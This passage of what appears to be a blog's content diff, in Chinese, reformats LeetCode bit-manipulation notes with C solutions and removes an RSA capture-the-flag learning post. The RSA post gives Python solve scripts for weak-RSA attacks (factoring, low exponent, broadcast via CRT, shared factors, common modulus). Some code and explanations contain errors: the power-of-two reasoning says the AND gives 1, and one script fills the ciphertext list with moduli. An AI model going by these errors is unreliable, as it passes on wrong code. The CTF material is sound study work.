-<p>符号：&amp;</p>
-<p>12&amp;10—&gt;1100&amp;1010（转换为二进制）</p>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="位与"><a href="#位与" class="headerlink" title="位与"></a>位与</h4><p>符号：&amp;</p>
+<p>12&amp;10—-&gt;1100&amp;1010（转换为二进制）</p>
 <p>从低到高按位运算，当两个数字都为1，结果才为1，否则为0，因此结果为1000，也就是8</p>
-<h4 id="位或">位或</h4>
-<p>符号：|</p>
-<p>12|10-----&gt;1100|1010</p>
+<h4 id="位或"><a href="#位或" class="headerlink" title="位或"></a>位或</h4><p>符号：|</p>
+<p>12|10——-&gt;1100|1010</p>
 <p>从低到高按位运算，当两个数字都为0，结果才为0，否则为1，因此结果为1110，也就是14</p>
 <p>小概念：相同的数异或为0，任何数与0异或为它本身，满足交换律和结合律</p>
-<h4 id="异或">异或</h4>
-<p>符号：^</p>
-<p>12^10-----&gt;1100^1010</p>
+<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>符号：^</p>
+<p>12\^10——-&gt;1100^1010</p>
 <p>从低到高按位运算，当两个数字都不同，结果才为1，否则为0，因此结果为0110，也就是6。</p>
 <p>从结果来看，异或可以看作不进位的加法</p>
-<h4 id="左移">左移</h4>
-<p>符号：&lt;&lt;</p>
-<p>12&lt;&lt;3-----&gt;1100&lt;&lt;3</p>
+<h4 id="左移"><a href="#左移" class="headerlink" title="左移"></a>左移</h4><p>符号：&lt;&lt;</p>
+<p>12&lt;<3----->1100&lt;&lt;3</p>
 <p>想左移三位，末尾补零，因此结果为1100000.另外，左移一位可以看作该数字乘二。</p>
-<h4 id="右移">右移</h4>
-<p>符号: &gt;&gt;</p>
-<p>12&gt;&gt;3-----&gt;1100&gt;&gt;3=1</p>
+<h4 id="右移"><a href="#右移" class="headerlink" title="右移"></a>右移</h4><p>符号: &gt;&gt;</p>
+<p>12&gt;&gt;3——-&gt;1100&gt;&gt;3=1</p>
 <p>右移三位，右移一位可看作除二向下取整</p>
-<h3 id="例题">例题</h3>
-<h4 id="2的幂">2的幂</h4>
-<p><a href="https://leetcode.cn/problems/power-of-two/">https://leetcode.cn/problems/power-of-two/</a></p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="2的幂"><a href="#2的幂" class="headerlink" title="2的幂"></a>2的幂</h4><p><a href="https://leetcode.cn/problems/power-of-two/">https://leetcode.cn/problems/power-of-two/</a></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;<span class="number">0</span>&amp;&amp;(n&amp;(n<span class="number">-1</span>))==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解析：当一个数为2的幂时，他的表达方式一定为100000…，这个数n表达方式固定，n-1则确定为0111111…。因此对n和n-1取位与，结果一定为1，因此可判断。</p>
-<h4 id="4的幂">4的幂</h4>
-<p><a href="https://leetcode.cn/problems/power-of-four/">https://leetcode.cn/problems/power-of-four/</a></p>
+<p>解析：当一个数为2的幂时，他的表达方式一定为100000….，这个数n表达方式固定，n-1则确定为0111111….。因此对n和n-1取位与，结果一定为1，因此可判断。</p>
+<h4 id="4的幂"><a href="#4的幂" class="headerlink" title="4的幂"></a>4的幂</h4><p><a href="https://leetcode.cn/problems/power-of-four/">https://leetcode.cn/problems/power-of-four/</a></p>
 <p>解析：分析可知：$2^{2x}mod 3=1$ 且 $2^{2x+1}mod 3=2$ 因此可以得出结论$4^xmod3=1$ 。因此，当一个数n是2的幂，同时模3为1，则他一定是4的幂</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool isPowerOfFour(int n)&#123;</span><br><span class="line">    return (n&gt;0)&amp;&amp;(n&amp;(n-1))==0&amp;&amp;n % 3==1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="位1的个数">位1的个数</h4>
-<p><a href="https://leetcode.cn/problems/number-of-1-bits/">https://leetcode.cn/problems/number-of-1-bits/</a></p>
-<p>解析：任何一个数字的二进制表示必然可以表示为0，1的组合，当一个数字的二进制形式为…1000时我们把它减去1，则变为形式…0111,当我们把这两个数进行位与运算，得到的结果为…0000。我们发现最末尾的1被我们消除了，当我们重复这个过程，在这个过程中记录进行的次数，当最后n变为0时，计数结果就为1的个数。</p>
+<h4 id="位1的个数"><a href="#位1的个数" class="headerlink" title="位1的个数"></a>位1的个数</h4><p><a href="https://leetcode.cn/problems/number-of-1-bits/">https://leetcode.cn/problems/number-of-1-bits/</a></p>
+<p>解析：任何一个数字的二进制表示必然可以表示为0，1的组合，当一个数字的二进制形式为….1000时我们把它减去1，则变为形式…..0111,当我们把这两个数进行位与运算，得到的结果为…..0000。我们发现最末尾的1被我们消除了，当我们重复这个过程，在这个过程中记录进行的次数，当最后n变为0时，计数结果就为1的个数。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingWeight</span><span class="params">(<span class="type">uint32_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="type">int</span> ans=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        n=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="交换数字">交换数字</h4>
-<p><a href="https://leetcode.cn/problems/swap-numbers-lcci/">https://leetcode.cn/problems/swap-numbers-lcci/</a></p>
+<h4 id="交换数字"><a href="#交换数字" class="headerlink" title="交换数字"></a>交换数字</h4><p><a href="https://leetcode.cn/problems/swap-numbers-lcci/">https://leetcode.cn/problems/swap-numbers-lcci/</a></p>
 <p>解法：</p>
 <ul>
-<li>a=a^b</li>
-<li>b=a^b=a^b^b=a^0=a</li>
-<li>a=a^b=a^a^b=b</li>
+<li>a=a\^b</li>
+<li>b=a\^b=a\^b\^b=a\^0=a</li>
+<li>a=a\^b=a\^a\^b=b</li>
 </ul>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">swapNumbers</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> aSize, <span class="type">int</span>* returnSize)</span>&#123;</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">1</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    *returnSize=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="只出现一次的数字">只出现一次的数字</h4>
-<p><a href="https://leetcode.cn/problems/single-number/">https://leetcode.cn/problems/single-number/</a></p>
+<h4 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h4><p><a href="https://leetcode.cn/problems/single-number/">https://leetcode.cn/problems/single-number/</a></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum=sum^nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>解法：很巧妙的解法，根据异或的性质，我们发现当我们从头开始循环异或，出现两次的数必然可以结合异或结果为0，最后只剩下异或结果为本身的数，这个数就是出现一次的数。(草，真的牛逼)</p>
-<h4 id="汉明距离">汉明距离</h4>
-<p><a href="https://leetcode.cn/problems/hamming-distance/">https://leetcode.cn/problems/hamming-distance/</a></p>
+<h4 id="汉明距离"><a href="#汉明距离" class="headerlink" title="汉明距离"></a>汉明距离</h4><p><a href="https://leetcode.cn/problems/hamming-distance/">https://leetcode.cn/problems/hamming-distance/</a></p>
 <p>解析：把两个数字异或，我们发现结果为1的位上就是两个数字对应二进制位不同的位置，因此我们把异或后的结果进行1消去，同时统计1的个数，答案就是汉明距离。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingDistance</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">    <span class="type">int</span> n=x^y;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        n=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="交替位二进制数">交替位二进制数</h4>
-<p><a href="https://leetcode.cn/problems/binary-number-with-alternating-bits/">https://leetcode.cn/problems/binary-number-with-alternating-bits/</a></p>
+<h4 id="交替位二进制数"><a href="#交替位二进制数" class="headerlink" title="交替位二进制数"></a>交替位二进制数</h4><p><a href="https://leetcode.cn/problems/binary-number-with-alternating-bits/">https://leetcode.cn/problems/binary-number-with-alternating-bits/</a></p>
 <p>解析：题目意思可以视为判断数字n的二进制表达形式是否为01连续出现，我们判断当00和11出现时对应的十进制数字为0和3，因此我们将数字n与3位与，如果符合题意，得到的结果只能是10或者01，即为1，2，如果出现0，3，则说明n中出现了00，11的组合，则返回false。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((n&amp;<span class="number">3</span>)==<span class="number">0</span>||(n&amp;<span class="number">3</span>)==<span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        n=n&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="找出所有子集的异或总和再求和">找出所有子集的异或总和再求和</h4>
-<p><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/">https://leetcode.cn/problems/sum-of-all-subset-xor-totals/</a></p>
+<h4 id="找出所有子集的异或总和再求和"><a href="#找出所有子集的异或总和再求和" class="headerlink" title="找出所有子集的异或总和再求和"></a>找出所有子集的异或总和再求和</h4><p><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/">https://leetcode.cn/problems/sum-of-all-subset-xor-totals/</a></p>
 <p>解析：这个题我搞了半天（md我怎么这么菜），首先是我们要明白一个数组的子集个数是2的元素个数的次方，因此第一个循环是为了找到所有的子集，当我们找到所有子集之后，我们要对每一个子集进行分析，因为集合中的元素在子集中只会有两种状态，0（未出现）和1（出现），因此，<strong>每个子集都可以表示为一个二进制数字</strong>，比如数组[2,3,4]的子集之一[2,3]，用相对应的二进制数字来表示就是110。这样表示完每一个子集后，我们对每一个二进制数进行分析，当我们在二进制数中寻找到1时，说明对应的数组nums[i]在子集中存在，就可以进行异或操作了，而寻找二进制数中的1可以用一个表达式来解决:<strong>i&amp;(1&lt;&lt;j)</strong>。意思是寻找二进制数i在第j位是否为1。当第二次循环遍历二进制数位数之后，我们就可以确定存在的元素，就可以进行必要的异或和相加的操作了。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">subsetXORSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,ans;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;numsSize);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j)) ans^=nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="两整数之和">两整数之和</h4>
-<p>阴间题目，要求不能用+，-完成两数求和。</p>
+<h4 id="两整数之和"><a href="#两整数之和" class="headerlink" title="两整数之和"></a>两整数之和</h4><p>阴间题目，要求不能用+，-完成两数求和。</p>
 <p><a href="https://leetcode.cn/problems/sum-of-two-integers/">https://leetcode.cn/problems/sum-of-two-integers/</a></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b==<span class="number">0</span>?a:getSum(a^b,(<span class="type">unsigned</span> <span class="type">int</span>)(a&amp;b)&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>分析：首先已知a^b可以表示为不考虑a和b的情况下a和b的家和，因此我们要找到进位情况下进的位的那个数字，是(a&amp;b)&lt;&lt;1，因此呢我们只要递归运算a^b和(a&amp;b)&lt;&lt;1的和即可。每次当我们进行(a&amp;b)&lt;&lt;1时，产生的结果0，1分别代表着不进位，进位。因此，如果不进位，结果就是a^b，即返回函数参数“a”。而当结果不为0，即连个数字都为1时，需要进位，进位则表示着这一个1在后一位相加，而后一位的相加同样可以表示为上述过程，仔细思考可以发现，递归出口在函数参数&quot;b&quot;为0的时候，这个时候进位完毕，输出结果a^b就是最后答案。</p>
-<h4 id="插入">插入</h4>
-<p><a href="https://leetcode.cn/problems/insert-into-bits-lcci/">https://leetcode.cn/problems/insert-into-bits-lcci/</a></p>
+<p>分析：首先已知a\^b可以表示为不考虑a和b的情况下a和b的家和，因此我们要找到进位情况下进的位的那个数字，是(a&amp;b)&lt;&lt;1，因此呢我们只要递归运算a\^b和(a&amp;b)&lt;&lt;1的和即可。每次当我们进行(a&amp;b)&lt;&lt;1时，产生的结果0，1分别代表着不进位，进位。因此，如果不进位，结果就是a\^b，即返回函数参数“a”。而当结果不为0，即连个数字都为1时，需要进位，进位则表示着这一个1在后一位相加，而后一位的相加同样可以表示为上述过程，仔细思考可以发现，递归出口在函数参数”b”为0的时候，这个时候进位完毕，输出结果a\^b就是最后答案。</p>
+<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p><a href="https://leetcode.cn/problems/insert-into-bits-lcci/">https://leetcode.cn/problems/insert-into-bits-lcci/</a></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">insertBits</span><span class="params">(<span class="type">int</span> N, <span class="type">int</span> M, <span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=j;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        N&amp;=~((<span class="type">long</span> <span class="type">long</span>)<span class="number">1</span>&lt;&lt;k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> N|(M&lt;&lt;i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>解析：博主摆烂了…</p>
 ]]></content>
@@ -377,119 +417,34 @@
       </tags>
   </entry>
   <entry>
-    <title>RSA学习</title>
-    <url>/2022/11/01/RSA%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h3 id="RSA学习">RSA学习</h3>
-<h4 id="了解结构">了解结构</h4>
-<ul>
-<li>
-<p>明文m</p>
-</li>
-<li>
-<p>密文c</p>
-</li>
-<li>
-<p>公钥e，一个整数，一般情况下是公开的</p>
-</li>
-<li>
-<p>两个大质数p,q,一般不公开，通过计算n=p*q得到n，此时n的逆向分解很困难，保证加密安全性</p>
-</li>
-<li>
-<p>私钥d,解密用的钥匙，不公开，但满足条件$e*d mod (p-1)(q-1)=1$ .所以可计算得出,计算代码：</p>
-<p>gmpy2.invert(e,(p-1)*(q-1))</p>
-</li>
-<li>
-<p>加密过程：$c=m^emodn$ 计算代码: c=pow(m,e,n)</p>
-</li>
-<li>
-<p>解密过程：$m=c^dmod n$ 计算代码：m=pow(c,d,n)</p>
-</li>
-</ul>
-<h4 id="n可以被直接分解">n可以被直接分解</h4>
-<p>例题：BUUCTF：[WUSTCTF2020]babyrsa</p>
-<p>附件给出c,n,e,此题的n不算太大，因此可以分解n为p,q,然后算出私钥d,即可解出答案</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">28767758880940662779934612526152562406674613203406706867456395986985664083182</span></span><br><span class="line">n = <span class="number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p=<span class="number">189239861511125143212536989589123569301</span></span><br><span class="line">q=<span class="number">386123125371923651191219869811293586459</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>,d)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
-<h4 id="低加密指数攻击-e很小">低加密指数攻击 (e很小)</h4>
-<p>特征，n很大但e很小</p>
-<p>例题：BUUCTF Dangrous RSA</p>
-<p>此题n太大了，分解不了，因此换一个思路，由于e 很小，则有条件$c=m^e+kn$ 。这样我们可以爆破这个k的值，让m可以开方，这样可以直接爆破出密文</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 爆破函数，从k=0开始，逐步爆破，直到m可以被e开方</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = c - n*k</span><br><span class="line">        result, flag = gmpy2.iroot(m, e) <span class="comment">#判断m开方e是否为整数，如是，则flag=True。</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
-<h4 id="低指数加密广播攻击">低指数加密广播攻击</h4>
-<p>特征:多组n，c，但是使用的是同一个e且e很小</p>
-<p>例题：BUUCTF RSA4</p>
-<p>多组n,c时考虑将n,c放入数组中，形式为n=[n1,n2,n3]，c=[c1,c2,c3]。然后使用sympy库中的中国剩余定理，这具体是个啥定理我目前也不太理解，但是调用crt(c,n)方法可以得出m的e次方，最后开方即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1=<span class="built_in">int</span>(<span class="string">&#x27;331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004&#x27;</span>,<span class="number">5</span>)</span><br><span class="line">c1=<span class="built_in">int</span>(<span class="string">&#x27;310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243&#x27;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n2=<span class="built_in">int</span>(<span class="string">&#x27;302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114&#x27;</span>,<span class="number">5</span>)</span><br><span class="line">c2=<span class="built_in">int</span>(<span class="string">&#x27;112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344&#x27;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n3=<span class="built_in">int</span>(<span class="string">&#x27;332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323&#x27;</span>,<span class="number">5</span>)</span><br><span class="line">c3=<span class="built_in">int</span>(<span class="string">&#x27;10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242&#x27;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">e=<span class="number">1</span></span><br><span class="line">n=[n1,n2,n3]</span><br><span class="line">c=[c1,c2,c3]</span><br><span class="line">result,mod=crt(n,c)</span><br><span class="line"><span class="comment">#这里我爆破e的值，如果开方成功则输出答案</span></span><br><span class="line"><span class="keyword">while</span> e&lt;<span class="number">1000</span>:</span><br><span class="line">    value, is_perfect = gmpy2.iroot(result, e)</span><br><span class="line">    <span class="keyword">if</span> is_perfect==<span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(value))</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<h4 id="公因数攻击">公因数攻击</h4>
-<p>特征：很多组n,c</p>
-<p>例题：BUUCTF RSA5</p>
-<p>题目给出了e和贼多组n，c。因此考虑公因数攻击，当有很多组n时，有可能出现两个n之间存在公因数的情况。又因为n是由指数p*q,因此得到公因数就等于得到了p和q，则题目可解</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c1 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">...........</span><br><span class="line"><span class="comment">#20组数据就不摆上来了</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line">p=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    n.append(<span class="built_in">eval</span>(<span class="string">&#x27;n&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">    c.append(<span class="built_in">eval</span>(<span class="string">&#x27;n&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(n[i],n[j])!=<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;i=%d j=%d&quot;</span> %(i,j))</span><br><span class="line">            <span class="built_in">print</span>(gmpy2.gcd(n[i],n[j]))</span><br><span class="line"></span><br><span class="line">p=gmpy2.gcd(n5,n18)</span><br><span class="line">q=n18//p</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c18,d,n18)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
-<h4 id="共模攻击">共模攻击</h4>
-<p>特征:多组e，c，共用一个n，且e之间最好互质</p>
-<p>例题：BUUCTF [BJDCTF2020]rsa_output</p>
-<p>解法：当e1,e2互质时，他们的最大公因数为1，即gcd(e1,e2)=1。根据欧几里得拓展算法，可以得到一个有解的式子：$e1<em>x+e2</em>y=gcd(e1,e2)$ 。得到x,y之后，根据加密过程，化简式子可得:$m=(c1^x*c2^y)modn$。由此得到明文。</p>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line"></span><br><span class="line">e1=<span class="number">3659</span></span><br><span 